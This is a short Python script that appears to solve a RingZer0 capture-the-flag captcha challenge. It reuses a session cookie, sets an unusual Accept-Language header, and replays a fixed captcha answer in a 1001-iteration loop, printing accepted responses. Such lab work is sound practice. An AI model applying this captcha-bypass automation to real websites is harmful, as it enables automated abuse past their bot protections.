#!/usr/bin/env python3

import http.client
import urllib.parse

conn = http.client.HTTPConnection("challenges.ringzer0team.com:10289")
conn.request("GET", "/form3.php")
resp = conn.getresponse()
session_id = resp.headers["Set-Cookie"].split(";")[0].split("=")[1]
body = resp.read()

print(session_id)

headers = {
    "Cookie": "PHPSESSID=" + session_id,
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept-Language": "ts"
}

for n in range(0, 1001):
    conn.request("GET", "/captcha/captchabroken3.php?new", None, headers)
    resp = conn.getresponse()
    body = resp.read()

    params = urllib.parse.urlencode({
        "captcha": "testlang"
    })
    conn.request("POST", "/captcha3.php", params, headers)
    resp = conn.getresponse()
    body = resp.read()
    if b"wrong" not in body:
        print(n, body)

conn.close()
